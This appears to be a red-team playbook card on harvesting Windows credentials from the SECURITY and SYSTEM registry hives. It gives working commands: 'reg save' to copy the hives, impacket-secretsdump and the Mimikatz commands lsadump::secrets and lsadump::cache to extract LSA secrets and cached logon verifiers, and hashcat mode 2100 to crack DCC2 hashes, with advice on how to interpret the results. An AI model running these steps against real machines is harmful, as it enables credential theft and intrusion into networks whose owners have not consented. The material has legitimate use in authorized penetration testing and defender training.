01

When to investigate

Matched SECURITY/SYSTEM material is accessible

STARTING ACCESS
A domain identity, appropriate host privilege, or a validated effective directory-object right
LOOK HERE
Inspect the rights and origin of a protected registry backup and distinguish SECURITY data from SAM before collection/parsing.
hostname
whoami /priv
02

Check the enabling conditions

Appropriate host/read privilege and complete matching key/source files

reg save HKLM\SECURITY C:\Windows\Temp\SECURITY.save
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.save
Confirm matched key material and classify every returned service/machine secret or DCC2 record.
Recognize the clue in sample output SYNTHETIC
Available snapshot: SECURITY.save
Matching SYSTEM.save: verify
Expected outputs: LSA secrets and cached logon records

A SECURITY source targets secrets/cached verifiers with distinct semantics; it is not simply another SAM.

03

Take the next action

Use the baseline when its conditions match. Expand the procedure for complete context-specific variants.

reg save HKLM\SECURITY C:\Windows\Temp\SECURITY.hive /y
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hive /y

impacket-secretsdump -security SECURITY.hive -system SYSTEM.hive LOCAL

Mimikatz alternative:

privilege::debug
token::elevate
lsadump::secrets
lsadump::cache

Potential categories:

  • $MACHINE.ACC: member computer's domain-account secret/key material;
  • service/autologon secrets: usefulness depends on whether the service/account remains active;
  • NL$1-style cached logon data: DCC2/MSCache v2 verifier material.

DCC2 is for offline guessing, not Pass-the-Hash:

hashcat -m 2100 dcc2.hashes wordlist.txt -r /usr/share/hashcat/rules/best64.rule

Verify the exact format with the installed Hashcat examples before cracking.

04

Interpret the result

VERIFY

Retain source, account, type and required factors; do not label every parsed output a Pass-the-Hash credential.

IF IT FAILS

Absent cached entries or protected secrets are source-specific limitations; use another justified credential source.

Enabled after validation

A complete matched source yields usable typed material: choose its type-specific next method.

Ruled out in this context

The SYSTEM file comes from another snapshot/machine: reject that consistency assumption.

Still inconclusive

An empty parser result with incomplete source/context leaves credential absence unproved.

Mechanics & a worked example

Why it works

Different SECURITY records encode different capabilities. DCC2 is an offline verifier; a machine-account secret and a service password have different identities and compatible uses.

Hypothetical worked example

Observation: offline parsing yields both a cached logon verifier and a service secret. Test: classify each output independently. Illustrative output: DCC2 needs recovery while the service password can be validated directly. Interpretation: choose separate next methods.
